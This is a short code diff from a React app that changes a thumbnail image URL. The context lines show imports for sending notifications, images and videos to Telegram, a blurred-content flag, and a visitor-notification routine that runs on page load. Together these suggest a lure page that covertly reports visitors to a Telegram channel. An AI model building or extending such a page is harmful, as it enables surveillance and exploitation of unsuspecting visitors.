@@ -4,7 +4,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } fr
 
 function App() {
   const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://cekresi.com/images/petunjuk-cek-resi.jpg';
+  const thumbnailUrl = 'https://asset.kompas.com/crops/8555nxF39hG24drHcCoqlNrcKig=/0x0:1527x764/780x390/data/photo/2023/11/02/654285fd036c8.png';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
